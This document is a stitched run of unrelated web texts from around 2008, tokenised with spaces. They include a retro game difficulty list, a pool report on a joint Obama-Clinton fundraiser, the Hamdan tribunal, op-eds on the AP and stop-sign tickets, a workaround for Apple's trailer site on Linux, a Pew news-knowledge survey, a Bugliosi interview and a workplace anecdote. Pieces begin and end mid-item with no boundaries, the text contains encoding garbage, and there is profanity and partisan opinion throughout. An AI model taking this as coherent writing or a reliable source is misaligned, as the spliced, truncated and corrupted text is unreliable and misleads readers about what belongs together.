This guy will back up until he is off screen , where you are unable to go or hit him .
As long as you attack , he 'll stay offscreen , out of harm 's way .
Just when you 've loured him back out to where you can hit him , he 'll back up and offscreen again when you resume your attack .
Zelda 2 was one of the very few games I never completed , and a lot of that had to do with Darknuts .
There 's a mandingo joke just begging to be made right about now .
10 . Rocks on the Road in The Adventures of Bayou Billy
Bayou Billy is the second - hardest game on this list , after Ghosts N Goblins , but it 's pretty close .
Bayou Billy was essentially three styles of games in one : a fighting game , a first person shooter , and a driving game .
The driving part was , by far , the most difficult and the most annoying .
The poor , choppy graphics and lack of detail could cause seizures , but the real stress came from how easily you could be killed .
Other Jeeps would try and crash into you and planes and helicopters would drop bombs in the road .
Swerving off the road and into a post would result in death , as well .
Many , many times I would outrun and destroy the enemy vehicles , all while staying on the road , only to be done in by the most annoying " enemy " in the game : a big fucking rock sitting in the middle of the fucking road .
My car would blow to smithereens and then , in real life , I 'd smash my controller to smithereens .
I really should have started smoking weed when I was 10 .

Canadian rockers
The Craft Economy — whom we blogged last year when they stapled their CC - licensed CDs to telephone poles — have done it again .

The disc , containing a demo of " Menergy , " a track off of the band 's upcoming record ( due late August ) is n't simply Creative Commons licensed music like their previous hydro pole - only release , this time it 's a Bill C - 61 protest too ( see that little piece of paper sticking out of the back of the disc ?
Yeah , that 's the protest part ) .

The Obamas max out
In a fairly potent symbolic gesture , the Obamas put $ 4,600 of their own money toward relieving Clinton 's debt .
Pool report from the joint event , which some found awkward , after the jump .
Quick summary : The 30 - minute event was emotional and upbeat .
Both candidates warmly received , generous to each other , and very focused on winning .
About 200 people attended .
Partial guest list below .
Also , before the event , your pooler witnessed Obama finance committee chair Penny Pritzker writing a $ 4,600 check from her and her husband to help retire Clinton ’s debt .
“ We ’re helping .
It ’s important , ” Pritzker said , on her way into the ballroom .
The M.C. for the night was Terry McAuliffe .
As Clinton walked on stage , followed by Obama , Clinton ’s money man pointed out that the group had collectively raised $ 230 million for Clinton ’s campaign .
Congratulating Obama , McAuliffe rallied the troops one last time , “ This , folks , was a magnificent race … This party is on fire . ”
Turning back to Clinton , McAuliffe said she has great future , “ no matter what she does .
If she wants to become pope , it does n’t matter . ”
Obama and McAuliffe embraced and joked as Clinton moved up to the podium .
She started by knocking down the pope idea : “ First , I ’d have to become Catholic , and second , we do n’t want to go there . ”
Clinton profusely thanked her supporters for “ what you each have done over so many years .
I look out and I see faces of people who have been friends and colleagues and warriors at arms on so many different occasions . ”
She lamented that the party had only won three of the last 10 elections .
“ That is a sobering thought , ” she said , adapting her electability argument from the primary campaign .
“ For me this is intensely personal , because I want to see our country once again not just solving problems , which sounds very pragmatic , but lifting up our sights and finding the promise of our
country by once again producing the progress that is truly the American birthright .
It has slipped away from us . ”
She recalled her many months on the campaign trail – the countless people she had met , and all of their struggles .
Obama stood next to her , looking on as Clinton spoke .
“ We have to make it a priority in our lives to elect Barack Obama the next president of the United States , ” Clinton said , to sustained applause .
“ This was a hard - fought campaign , ” she continued .
“ That ’s what made it so exciting and intense and why people ’s passions ran so high on both sides .
I know my supporters have extremely strong feelings , and I know Barack ’s do as well .
But we are a family , and we have an opportunity now to really demonstrate clearly we do know what ’s at stake , and we will do whatever it takes to win back this White House . ”
“ Here here ! ” a man shouted , to more robust applause .
Clinton acknowledged Reps. Sheila Jackson - Lee and Stephanie Tubbs Jones , two of her most prominent and devoted African American supporters .
Someone pointed out that Rep. Anthony Weiner was in the room as well .
And then she wrapped up with this : “ Let me , to my friends , and you are all my friends , I am just so intensely grateful to each and every one of you .
We have a lot of work to do , going forward , not only the election , but once the election is over , to making sure we realize all the benefits that this election can and should bring to our country .
So let me introduce my friend
Sen . Barack Obama to my friends , all of these wonderful people who have met
so much to me in my life . ”
Next it was Obama ’s turn , and he told two stories about his family to “ illustrate the extraordinary nature of ( Clinton ’s ) public service , and extraordinary nature of her campaign . ”
One was the familiar tale of Obama ’s maternal grandmother , who worked on a bomber assembly line during World War II , but who never went to college because she did n’t qualify for the G.I. bill — yet rose from bank secretary to bank vice president .
He talked to her frequently during the primary season , and obviously “ she was rooting for her grandson , ” Obama said .
But she also complained that Clinton was n’t getting a fair shake .
“ When I see that instinct of hers to fight on behalf of those who need a champion , she reminds me a little of me , ” Obama ’s grandmother told him .
He said the story illustrated “ the ability of Hillary Clinton to inspire passion on behalf of those who have been left out in the past . ”
Then he told of being surprised that his 9 - year - old daughter Malia had been well aware of the historic nature of the Clinton - Obama duel .
Her father , she knew , could be the first African American president .
But she also observed that Clinton could be the first woman .
“ Then she said , it ’s about time , and rolled over and went to bed , ” Obama said .
As the laughter died down , he continued , “ between my grandmother ’s generation and my young daughter , there ’s a testimony to the challenges that are hard won and hard fought .
To the point that my 9 - year - old takes for granted that of course we can have a woman president .
Of course we can have an African - American president .
But that does n’t come just by the passage of time .
It comes because people are consistently working and fighting . ”
Like Clinton , he recalled the many struggling people he has met on the campaign trail .
He said of his former rival , “ It was an extraordinary honor to be alongside her during the course of this campaign .
It was an extraordinary test . ”
Her recognized “ her tenacity , her fighting spirit .
I
am a better candidate as a consequence of having run against Sen. Hillary Rodham Clinton . ”
Obama continued , “ I recognize that this room shared the same passion that a roomful of my supporters would show .
I do not expect that passion to be transferred .
Sen .
Clinton is unique , and your relationships with her are unique . ”
But he added , “ Sen. Clinton and I at our core agree deeply that this country needs to change . ”
Finally , at the end of his remarks , Obama made a direct appeal for support .
“ I ’m going to need Hillary by my side campaigning during his election , and I ’m going to need all of you . ”
He recounted how he had told his top fundraisers this week “ to get out their checkbooks and start working to make sure Sen.
Clinton — the debt that ’s out there needs to be taken care
of . ”
And that , folks , was the night ’s big applause line .
In vowing to help pay off Clinton ’s debt , Obama won a standing ovation .
Hilzoy criticizes John McCain for asking congress to work overtime to " solve " the " energy crisis " .
This misses the more important point , which is that John McCain is dead wrong .
He could n't be wronger if he were wearing white shoes and pants after Labor Day - - in a coal mine .
Any true conservative should instinctively understand that the best way for Congress to help the American people is to stop doing more stuff .
We 're having enough trouble dealing with the stuff they 've already done .
Moreover , oil is already down about 20 % off its peak without any government intervention at all .
It 's almost as if there were something -- let 's call it a " market " -- that was capable of adjusting demand to match supply .
Whenever a proper conservative hears about a government plan to " fix " the market , this should immediately call to mind Tom Lehrer 's line about another sort of government intervention :
" Let 's make peace . . . the way they did in Stanleyville and Saigon "

In case you 're wondering why The Associated Press is so zealously defensive about people saying newspapers do n't need them , it 's because newspapers do n't need them .
The Minneapolis Star - Tribune is the latest paper to cancel AP service .
In Washington , The Spokesman Review of Spokane canceled around the same time that The Bakersfield Californian cut ties .
Several smaller newspapers have joined in .
In Ohio , eight of the top newspapers , including The Cleveland Plain Dealer , The Columbus Dispatch , The Cincinnati Enquirer and The Toledo Blade , decided to create their own network , the Ohio News Organization .
Now they share local news without submitting it to the AP .
You can expect this trend to continue .
The reason is that with multiple 24 - hour news networks , countless news sites online , and even news content on cell phones , consumers can access news from almost anywhere for free .
Commoditized news like what the AP offers does n't add much value to a newspaper while costing newspapers hundreds of thousands , even millions of dollars a year .
Even after newspapers demanded the Associated Press reduce its fees next year , that cut of approximately 10 % still makes the AP a very large budget item for progressively smaller newspaper budgets .
The Associated Press 's response to the changing media landscape has been less than impressive .
Most famously , it was ridiculed for trying to charge bloggers for using five - word excerpts at up to $ 2.50 a word .
With the increasing threat of mass newspaper cancellation , it 's easy to understand why the AP has been so reactive and heavy - handed lately .
While Ron Fournier 's predecessor worries , " I just hope he does n't destroy it " , the slow death of the AP may continue regardless .
GUANTANAMO BAY , Cuba–The judge in the first American war crimes trial since World War II has barred evidence from " highly coercive " interrogations of Osama bin Laden 's driver following his capture in Afghanistan .
The chief prosecutor for the tribunals , U.S. Army Col.
Lawrence Morris , said the loss of some of Salim Hamdan 's statements will not keep the trial from going forward .
" It does not reduce my confidence in our ability fully to depict Mr. Hamdan 's criminality , " he told reporters .
" We 're fine . ''
Hamdan , who was captured at a roadblock in Afghanistan in November 2001 , pleaded not guilty at the start of a trial that will be closely watched as the first full test of the Pentagon 's system for prosecuting alleged terrorists , including Toronto - born Omar Khadr , who was reportedly subjected to sleep deprivation at Guantanamo Bay .
The judge , navy Capt .
Keith Allred , said the prosecution cannot use a series of interrogations of Hamdan at Bagram air base and Panshir , Afghanistan , because of the " highly coercive environments and conditions under which they were made . "
At Bagram , Hamdan says he was kept in isolation 24 hours a day with his hands and feet restrained , and armed soldiers prompted him to talk by kneeing him in the back .
He says his captors at Panshir repeatedly tied him up , put a bag over his head and knocked him to the ground .
His lawyers have alleged other abuse including sleep deprivation and solitary confinement .
The judge did leave the door open for the prosecution to use other statements Hamdan gave elsewhere in Afghanistan and at Guantanamo .
Defence lawyers asked Allred to throw out all of his interrogations , arguing he incriminated himself under the effects of abuse .
Hamdan , a Yemeni in his late 30s , faces a maximum life sentence , if convicted , of conspiracy and aiding terrorism .
Michael Berrigan , deputy chief defence counsel , described the ruling as a major blow to the tribunal system that allows hearsay and evidence obtained through coercion .
" It 's a very significant ruling because these prosecutions are built to take full advantage of statements obtained from detainees , " he said .
A jury of six officers with one alternate was selected from a pool of 13 flown in from other U.S. bases over the weekend .
Hamdan has been held at Guantanamo since May 2002 .
A challenge filed by his lawyers resulted in a 2006 Supreme Court ruling striking down the original rules for the military tribunals .
Congress and U.S. President George W. Bush responded with new rules , the Military Commissions Act .
Hamdan met bin Laden in Afghanistan in 1996 and began working on his farm before winning a promotion as his driver .
Random thoughts from somebody working on the next Windows OS
Many software designers intentionally create unnecessarily complex products that do less to serve their companies and customers than to advance their careers , according to the Management Insights feature in the current issue of Management Science .
“ The Hidden Perils of Career Concerns in R&D Organizations ” is by Enno Siemsen of the University of Illinois at Urbana Champaign .
Companies are struggling to cope with increasingly difficult and complex product design projects .
The study argues that this struggle is not only a result of accelerated technological change – product designers have an incentive to choose more difficult design solutions instead of simple solutions to further their careers .
Highly capable designers have an incentive to choose somewhat more difficult designs to better prove their talent , while less - capable designers have an incentive to choose highly difficult designs to obfuscate their lack of talent , Prof. Siemsen concludes .
One way to reduce these dysfunctional incentives , the author argues , is to move compensation agreements away from a long - term , career - oriented focus toward a more short - term focus in which bonuses are directly linked to the success or failure of projects .
Alternative ways to reduce these incentives are to collect better data on design task outcomes or to have product designers receive evaluations from managers who have an interest in the design projects succeeding and an excellent understanding of the technology .
In retrospect , professors who must have disagreed fundamentally with works such as David Donald 's " Lincoln Reconsidered " ( with its celebrated explanation of the abolitionists ' contempt for Lincoln in terms of the loss of status of their fathers ' once - privileged social group ) assigned them for our open - minded academic consideration .
My professor of Tudor - Stuart history , emerging from the bitter Oxbridge debates over explanations of the English Civil War in terms of class conflict , assigned Jack Hexter 's stunning " Reappraisals in Social History " to us .
When I opined to him somewhat apprehensively that Hexter appeared to have exposed the tendentious use of statistics in my professor 's own prior work , he replied , " You 're absolutely correct . "
These were not uncommon experiences in Princeton 's classrooms , and I knew , then and there , that I wanted both to do history and to teach .
In grad school at Harvard , while a few dates left in the midst of dinner on discovering my free - market and hawkish politics , and while I did get thrown out of a party for opposing , when asked , Eugene McCarthy 's view of Vietnam ( this should have been a warning ) , the classroom remained open and , by design , intellectually pluralistic .
In our graduate colloquium , we read the major historiographical debates , in works theoretical and monographic , and critical acumen was acknowledged in the force of an argument , not in its political provenance .
When Harvard exploded , in 1966 – 67 , I was in Paris , researching my dissertation in the Bibliothèque Nationale ; when Paris blew up the next year , I was locked away in Cambridge , Mass . , finishing my dissertation .
( My friends on the left , only partly in jest , explain my backwardness by my having missed two revolutions . )
When I went off on job interviews , I was not once asked a question , ever , about my worldview , but only about my historical research and notions of teaching .
Politics were simply not in the category of appropriate inquiry .
In social contexts , up through the 1970s , some few colleagues might be harsh over our political differences , but most loved the idea of individuals who thought differently from themselves .
In the midst of the " cultural revolution " of the early 1970s , I co-founded a College House and lived warmly with students who mostly ranged from liberal Democrats to true believers of the New Left .
They loved to discuss everything , and they did so in good faith and ( almost ) always ad rem .
My students , whom I still meet frequently outside of class , still love to discuss everything , and they still do so in good faith and without ad hominem distractions from real conversation and debate .
Critics of higher education who blame students for today 's catastrophes are categorically wrong about agency .
It is the faculties ( both the minority of zealots and the majority of cowards ) and the administrations ( both the minority of ideologues and the majority of careerists with double standards ) who are to blame .
The academic world I so loved revealed itself best in an undergraduate course I 'd taken on the history of Europe in the 20th century .
When the professor , a distinguished intellectual of the left , returned the midterms to the hundred - plus or so of us who were in his course , he said that we 'd saddened and embarrassed him .
" I gave you readings that allowed you to reach such diverse conclusions , " he explained , " but you all told me what you thought I wanted to hear . "
He informed us that he would add a major section to the final exam : " I 'm going to assign the book I disagree with most about the 20th century .
I 'm not going to ask you to criticize it , but , instead , to re-create its arguments with intellectual empathy , demonstrating that you understand the perspectives from which he understands and analyzes the world . "
I was moved by that .
The work was Friedrich Hayek 's " The Road to Serfdom , " and it changed the course of my intellectual and moral life .
Will Brock Lesnar Turn the UFC Into a Circus ?
is standing behindas he takes on the UFC full force .
Paul was one of the people that got Brock into the WWE in the beginning of his career .
Now he 's going from acting out fights to the real deal .
The Sun sat down with their own SunSport columnist Paul Heyman and talked about the 31 year old heavyweight fighter , who already seems to be causing quite the uproar .
Last Saturday
Brock took his first fight against the Texas Crazy Horse at the Minneapolis Target Center and showed that he may still have some of his WWE ways about him .
Clearly trying to get to his opponent and his team , Lesnar mocked them when they were in their corner by pretending to have a lasso and yelled " I fell off the horse against Frank Mir , and I got back on the stallion tonight and rode off on it . "
Lesnar made some lame excuse for his smack talk by saying " That 's just me , I was excited .
That was for Heath 's camp because on the way out to the Octagon there were some things said before the fight .
But I had the last laugh and the last thing to say - and that is all that matters to me . "
We 're not sure this ring is the right ring for Brock .
Here 's what Heyman had to say :
" That 's the real Brock Lesnar coming out .
That 's Lesnar through and through .
He thrives in an environment of trash talking , in your face competition .
He wants you to know that he 's better than you - and by the way , ' you suck ' ! "
Check out The Sun for the rest of the interview .
Do you think Lesnar will last in the Ultimate Fight Champion or is he trying to make it a circus ?
I have watched both of Lesnar 's fights and the first one I could n't wait to see .
Here 's this bigger than life guy who you think is going to destroy his opponent so I made a little wager on the fight against Frank Mir and lost because the big ass tapped out .
So last week when Lesnar took the ring again I made another sucker bet on him thinking there is no way a man with no neck is going to tap out two times in a row .
Lucky for me he pounced the Texas Crazy Horse right from the start and never let up or for that matter got off of him .
Let 's face it -- the ' Horse ' had to know that if Lesnar laid on him there was no getting up .
A recent article by John Stossel examined a Michigan police officer ’s penchant for giving out stop sign tickets as a means of increasing his income .
Day after day in Warren , Mich. , people wait in a long line to pay traffic fines .
Many are there because police say they did n’t come to a full stop at a stop sign .
Often the policeman saying that is Officer David Kanapsky .
On last week ’s “ 20/20 , ” you heard a motorist in court insist that she did come to a complete stop .
The judge replied , as judges there often do : “ I find Officer Kanapsky ’s testimony to be credible .
He is an unbiased witness . ”
But the officer is not really unbiased .
The more tickets he writes , the more overtime he gets .
Last year , Kanapsky spent so much time in court he increased his pay by $ 21,000 .
Rolling through a stop sign in Michigan puts two points on your driving record .
That hikes your car insurance premium .
Fighting the ticket could cost even more .
So to avoid the points and legal fees , most people plead guilty to a lesser offense : impeding traffic .
The court sounds like an assembly line , ” … no points … $ 135 … “ Last year , the town made half a million dollars from such fines .
Some drivers told us it “ seems like a moneymaking scam . ”
The city denies it , but Stossel is skeptical :
[ Police Commissioner William ]
Dwyer denied the tickets were a moneymaking scam .
He said he did n’t think it odd that Kanapsky wrote thousands of tickets .
“ It ’s not unusual for a traffic officer to write 10 to 20 traffic violations a day , if not more . ”
Please .
I ’m all for highway safety , but I suspect that America ’s roads have too many rules , and that gives cops too much arbitrary power to harass people or profit off them .
As the ancient Chinese philosopher Lao - Tse said , “ The more laws that are written , the more criminals are produced ” .
At the end of the article , Stossel references recent accident statistics that poke holes in the “ it ’s for safety ” argument :
Remember the stop sign in Warren , Mich. , where Kanapsky wrote many of his tickets ?
It ’s been changed to a yield sign .
One result : fewer accidents .
Police say , “ [ B]etween Jan. 16 , 2008 , and May 21 , 2008 , there have been no accidents reported .
During that same time frame in 2007 , there were four crashes reported . ”
Good .
Let ’s get rid of more signs .
And to all the cops who eagerly punish us for doing what they do , give me a break .

In November of last year , the city of Warren made our list of the worst speed trap cities in the United States .

Apple has decided to block streaming content from http://apple.com/trailers/ for Linux users .
I say this because tonight I went to view a few of the upcoming movie trailers and was told to “ Get the Latest Quicktime ” in order to watch and I was denied the ability to watch them .
I hit the forums to see if others have the same problems that I have and I ’ve found that many people have begun reporting the problem from around May of this year .
Not being one to give up , I decided to test things a bit to see what apple.com was doing .
I installed the useragent switcher on Firefox and switched my agent to Windows Vista and IE7 .
I then watched headers as apple once again denied me despite my agent being accepted by it .
It seems that it is looking for an actual install of Quicktime on your system ( I ca n’t tell you for sure , I just know that useragent is n’t what it is sniffing for ) .
How does one circumvent ?
Pretty simple .
When you are given that denied message “ Get the Latest Quicktime ” , go to View >>
Page Source .
Look for a URL that ends in .mov .
Copy that URL and paste it into a new tab .
That ’s it , you ’re now watching the trailer .
I want to thank Apple for being exclusionary to Linux users when you benefit so greatly from Open Source software .
It sets a great example and shows what is really important to you as a company … and that is forcing your software onto everyone similar to Microsoft .
UPDATE : I wanted to let everyone know my platform since everyone seems to think I ’m silly enough to blog about this without installing the proper codecs .
I use PCLinuxOS 2007 as my main workhorse distro .
The apple trailers site worked for me previously until I recently checked it .
I ’ve updated this
to current and have all codecs installed ( w32 codecs , mplayer , xine ,
gstreamer , etc. ) .
I have uninstalled , reinstalled , and tweaked
everything I can think of tweaking to get this working .
Nothing thus
far works .
I should note that this is with Firefox 3 and I ’m not sure
if that has anything to do with things .

State regulators in Colorado have given the green light to plans by Xcel Energy to shut down two coal - powered energy plants in the state , and build one of the world ’s largest utility - scale solar - power facilities .
Following discussions lasting several days , the Colorado Public Utilities Commission ( CPUC ) backed the power company ’s voluntary decision to close the two coal - fired plants at Denver and Grand Junction , making Xcel the first utility in the U.S. to make such a move solely in an effort to reduce emissions .
CPUC also approved Xcel plans to build a new 200 MW solar power plant with energy storage capacity in the state , and granted permission for the company to add 850 MW of intermittent renewable energy , such as wind power .
The move comes in response to Colorado state laws requiring large utilities to generate 20 % of their electricity from solar , wind or biomass sources by 2020 .
Xcel seems to be on track to meet the target with several years to spare .
The Cameo plant at Grand Junction is scheduled to close down in December 2010 , while the Arapahoe plant in Denver will be shut in 2012 .
Although Xcel have n’t yet invited bids from contractors to build the solar and wind plants , spokesman Mark Stutz has said , “ we look forward to those additions to our system by 2015 . ”
The Colorado decision follows recent announcements of large - scale renewable energy plans in Florida and Pennsylvania , and is hopefully a sign a of a growing trend throughout the U.S .

One - in - three Americans struggle badly with current events
The latest Pew Survey on News Consumption , which is conducted every other year , was released yesterday , and is chock full of interesting tidbits and results .
Most notably , there was a great section of the report on news - consumer knowledge and sophistication .
About half of Americans ( 53 % ) can correctly identify the Democrats as the party that has a majority in the U.S. House of Representatives .
In February 2007 , shortly after the Democrats gained control of the House after a dozen years of GOP rule , many more people ( 76 % ) knew the Democrats held the majority .
The public is less familiar with the secretary of state ( Condoleezza Rice ) and the prime minister of Great Britain ( Gordon Brown ) .
About four - in - ten ( 42 % ) can name Rice as the current secretary of state .
The public ’s ability to identify Rice has not changed much over recent years :
In April 2006 and December 2004 , shortly before she was sworn in , 43 % could correctly identify her .
The prime minister of Great Britain is not well known among the public .
Just more than a quarter ( 28 % ) can correctly identify Gordon Brown as the leader of Great Britain .
Overall , 18 % of the public is able to correctly answer all three political knowledge questions , while a third ( 33 % ) do not know the answer to any of the questions .
I ’ll admit , I ’m torn about how humiliating this is to the nation overall .
For the typical American not to know Gordon Brown strikes me as only mildly distressing — Brown has only been Prime Minister for about a year , and most of the public was probably more familiar with Tony Blair .
But one - in - three Americans got all of the questions wrong .
For all the talk about the Democratic Congress , barely half the country knows there ’s a Democratic majority .
Maybe my perspective is skewed because I just finished reading Rick Shenkman ’s “ Just How Stupid Are We ? ” but at a certain point , the political world is going to have to come to grips with the fact that a striking percentage of the electorate has no idea what ’s going on .
As for the other results from the Pew survey , it was also interesting to note which news consumers did better than others .
From the report :
Regular readers of magazines such as The New Yorker , The Atlantic , and Harper ’s Magazine stand out for their political knowledge ; almost half ( 48 % ) can correctly identify Rice , Brown and the majority party in the U.S. House of Representatives .
NPR listeners rank closely behind , with 44 % of regular listeners registering a high knowledge score .
More than four - in - ten regular Hardball ( 43 % ) and Hannity & Colmes ( 42 % ) viewers also score relatively high for political knowledge .
In general , well - educated news audiences have high levels of political knowledge ; for instance , 54 % of regular readers of publications such as The New Yorker , The Atlantic and Harper ’s Magazine are college graduates , as are 54 % of regular NPR listeners .
However , a greater proportion of regular readers of business magazines are college graduates ( 60 % ) , but just 36 % answered all three political knowledge questions correctly .
Just a third of regular Rush Limbaugh listeners are college graduates , but this audience scored as well on political knowledge as did regular business magazine readers .
Similarly , only about three - in - ten ( 31 % ) regular Hannity & Colmes listeners are college graduates , but a relatively large proportion ( 42 % ) answered all three questions correctly .
Some highly knowledgeable and attentive news audiences – such as The New Yorker ’s , Limbaugh ’s , Hannity & Colmes ’ or Hardball ’s – are older than average .
However , age is not always a correlate of political knowledge : the CBS Evening News has one of the oldest audiences of the news outlets included on the survey ; 63 % of the regular viewers of this program are 50 or older .
But just 10 % of regular CBS News viewers correctly answered the three questions .
The Colbert Report and The Daily Show are notable for having relatively well - informed audiences that are younger than the national average : 34 % of regular Colbert viewers answered the three political knowledge questions correctly , as did 30 % of regular Daily Show viewers .
Less than a quarter of either audience is older than 50 ( 22 % Colbert , 23 % Daily Show ) , compared with 41 % of the general public .
Now , I found this particularly interesting because four years ago , Fox News viewers were the most confused about current events , especially when it came to subjects such as weapons of mass destruction in Iraq and Saddam Hussein “ working closely ” with al Qaeda .
Viewers of “ The Daily Show ” were among the best informed at the time .
So , have things changed ?
I kind of doubt it — these Pew questions were easier and covered non-controversial subjects .
My hunch is , had Pew asked more about subjects relating to Republican talking points , those Fox News viewers would have done considerably worse .
Call it a hunch .
Vincent Bugliosi talks about prosecuting George Bush and his appearance before the House Judiciary Committee appearance .
The Prosecution of George W. Bush for Murder is a call to action .
A man of 73 , in the wake of years spent creating his masterwork , 2007 ’s Reclaiming History about the Kennedy assassination , has constructed his case with the passion of an idealistic college student .
Surely the rest of us are capable of catching one last wave of Bush & Co. outrage .
We do want to see Bush brought to justice , do n’t we ?
S&R : On July 25 you appeared on a panel before the House Judiciary Committee with the likes of Dennis Kucinich and Elizabeth Holtzman to examine the “ imperial presidency ” of George Bush .
When you appeared at the Great Mind Series in Los Angeles , it was reported that you said of Committee Chairman John Conyers , “ He ’s completely behind what I ’m doing here . ”
Do you think summoning you to speak was Conyers ’s way of shifting attention from impeachment to a process with a better chance of success ?
VB : Conyers called me up and said he read the book and liked it very much .
This was before there was any mention of the hearing .
Then I got the invitation .
So I spoke to his assistant and I said I ’m not an authority on impeachment .
I ’m only talking about prosecuting George Bush for first - degree murder .
Everyone there was talking about one of two things : executive power and constitutional limitations or impeachment , and I was talking about murder .
So they knew in advance .
Though they did n’t say it , they may have expanded the hearings for me .
I ’m just saying that I told them that I was not coming back there [ to Washington from L.A. — Ed. ] to talk about the subject matter of the hearings .
Although , certainly , if you ’re talking about the basis for impeachment — high crimes and misdemeanors — murder obviously qualifies as one .
They may have very well felt that what I was saying obviously did apply .
I tried to simplify for the hearing .
I did n’t have much time .
The difficulty always is it takes more time to figure out how to convey your message when you only have a short period of time .
[ Here Bugliosi cites the famous saying attributed to either Pascal , Voltaire , or Mark Twain : “ I did n’t have time to write a short letter , so I ’ve written a long one instead . ” â€ “- Ed. ]
They ’re telling me I ’ve got five minutes — tell me what ’s in your book in five minutes .
It took me more time to figure out how I was going to do that then if they said I had a half hour .
I tried to compress it into five minutes , which was not easy at all .
But I got some good stuff in there .
I want to make it very clear .
I definitely believe that Bush should be impeached .
There ’s no question about that .
It ’s just that I ’m not satisfied with impeachment , him not spending one day in the county jail , continuing to enjoy himself .
I do n’t see any real justice there .
But impeachment is n’t too likely because of a couple of things :
One , the time element .
Two , Nancy Pelosi , doing what Democrats do so well , is not in favor of impeachment and she ’s the speaker .
That makes it almost insurmountable when you have the speaker against it .
Three , impeachment would be good even if it ’s not successful .
Anything to stain the record of this terrible human being .
You ca n’t get a conviction on impeachment because you need two - third vote of the Senate and , as you know , the Senate is evenly divided between Republicans and Democrats .
Still , I ’d like to see an impeachment at least .
But the notion that would be enough for what he did is something that I do n’t agree with .
S&R : You ’re not working in opposition to Congressman Kucinich , who introduced articles of impeachment against Bush , are you ?
VB : No , absolutely not .
I agree with everything Dennis says .
But , again , impeachment alone is too good for George Bush .
S&R : You also said to the Judiciary Committee : “ It would greatly dishonor those in their graves who paid the ultimate price because of this war were you not to refer this case to the Department of Justice . ”
Does the go - ahead for a prosecution start with Conyers and his committee ?
VB : No , it does n’t start there .
This is just one way to get this case going and it ’s the least likely .
If they did it , then a criminal investigation would commence .
The attorney general in Washington DC , that would be the best way .
If anyone does anything â€ “ - I have to be candid with you â€ “ - it ’s unlikely that any one of the 93 federal attorneys would begin criminal proceedings without getting the consent of their boss in Washington , the attorney general .
And that ’s why , realistically , on a federal level , there is only one person who would ever bring criminal charges against Bush and that ’s the attorney general .
I want to point out that the burden that has to be met when referring a case to the attorney general ’s office is very low .
All that ’s required is that there be a quote reasonable unquote suspicion that a crime has been committed .
Surely , there ’s a reasonable suspicion here that Bush took this nation to war under false pretenses .
The attorney general ’s office can’t prosecute him now but they can commence the investigation immediately .
Then once he leaves office , at that point they can file charges .
But there ’s only one attorney general and it ’s a highly politicized office .
Parts 1 , 2 , 3 , 4 , 5 .

Michael Berkeley is clearly a man with a mission - to save beautiful British countryside from desecration by wind turbines .
Hence his article asserts that " we owe it to our children 's children to preserve it " ( A blot of turbines , July 28 ) .
Because I have on many occasions publicly acknowledged that I live in beautiful countryside , the fact that I have " put together a new application to Herefordshire for four turbines " in the Welsh Marches makes me , in Berkeley 's eyes , the ultimate vandal .
He has other problems with wind energy - " the incomprehensibly vast subsidies available " .
Berkeley is , like me , a farmer and thus will know a great deal about generous direct government subsidy .
But for wind turbines there is no equivalent .
There is only the same support as for all renewables , which is in the form of renewables obligation certificates that are funded by a small surcharge on everyone 's energy bills - currently around 0.35p / kWh .
Another problem is " the near negligible gain " from wind turbines .
Unlike some of his fellow travellers , Berkeley is no climate change denier .
Indeed he now drives a hybrid car and has a wood - burning stove : both very laudable actions .
It is absolutely crucial that we all do what we can .
And in my case one thing I can do is to combine with other local farmers to produce the electricity to supply around 6,000 homes .
But visual impact is clearly Berkeley 's main concern .
For some , wherever turbines are built will always be inappropriate .
The fact that since I first saw them in Cornwall some 15 years ago I have found them beautiful is neither here nor there - but it is relevant that repeated opinion surveys have shown that more than 70 % of people in this country either like or do not mind the visual impact ( though I am aware that some of the minority dislike them intensely ) .
When an application for 12 turbines overlooking Ardrossan , a small seaside town on the west coast of Scotland , was submitted , understandably there was considerable concern .
Yet a year after it was commissioned , one of the town 's councillors wrote : " The Ardrossan wind farm has been overwhelmingly accepted by local people - instead of spoiling the landscape , we believe it has been enhanced .
The turbines are impressive looking , bring a calming effect to the town and , contrary to the belief that they would be noisy , we have found them to be silent workhorses . "
The legacy we leave our children 's children is something I care about passionately , but my priorities are at variance with Berkeley's .
I believe that unless humankind does all it possibly can , as soon as it possibly can , the tipping point will be passed and climate change - probably within the lifetime of our children 's children - will be catastrophic .
But if humankind mends its ways and finds other forms of renewable energy , at the end of the 25 - year life of a wind farm the turbines can be taken down and the countryside will be indistinguishable from how it is now .

This was the first time he'd be working on a team , his first time at a company with dedicated testers , and his first time at an environment that was going to use source control .
Merv had n't used any source control software before , but he had seen it in use and even read up on some popular source control systems .
At his last job he'd been teased with source control a bit —
" We need to start using source control , " his boss once said .
" It 's urgent ! "
" OK , I 'll start researching it right away , " Merv replied .
" Oh no you wo n't !
I said ' urgent , ' not ' critical ! ' "
So having only high level knowledge of how source control was used , he'd have to hit the ground running at his new job .
Not that he was worried — it seemed like it'd be pretty simple .
A few days into the new job , Merv was all set up with a decent chunk of the codebase , some good specs , and all the development tools he could dream of .
It was heaven compared to his last job — he was cranking out prototypes and setting up meetings like there was no tomorrow , in addition to spotting and fixing the occasional bug in the product .
The first time he spotted a bug , he excitedly checked it out , which copied the latest version of the file to their dev environment , and made the fix .
A few minutes into it , he heard some incredibly fast and alarmingly loud footsteps coming toward him .
Startled , Merv spun around in his chair , his eyes at Joe 's belly button - level .
Sliding his chair back a few inches , Merv gave a tentative smile .
It did n't ease any of the tension .
Joe was bad news .
Although he was n't the lead developer , that did n't stop him from acting like he was .
If he was n't yelling at you , he was yelling to you about his incredible feats of software development strength .
" I worked on [ incredibly ancient mainframe ] back when they were state of the art !
You young punks with your C and your DB2 ! "
Joe was also famous for his temper , which he'd take out on the junior developers .
Or , if there were none available , his trash can .
Merv had n't been introduced to , or even heard of Joe before .
Merv was given a desk on the floor with all the business people , since there was no room on the third floor with the other devs .
Joe 's face was red and he had a little sweat on his brow .
He also had a slight facial tic , and an occasionally twitching finger .
" Are you * tic * the one that checked in changes to the archives page ? "
The man blinked as though it caused him physical pain .
A vein on his neck looked like it was ready to burst .
Merv swallowed the lump in his throat .
" Y... yes .
I checked it in . "
Joe 's eyes narrowed .
He took a deep breath and exhaled through his nose , which made an audible whistling noise .
The corner of his mouth twitched , then his finger , and without breaking eye contact he pounded a heavy fist on Merv 's desk .
The sound was like a starter 's pistol , both in terms of how it sounded and how it set Joe off .
" I hope you f#$king realize what you 've done !
Because of your dips& * #ted goddamn ' I can check whatever s&%t I want to whenever I f^#king please ' attitude , I lost two f%#king weeks of motherf * $ king work ! "
His tirade went on for minutes , his face getting redder , forehead sweatier , swear words unintelligibler with each passing second .
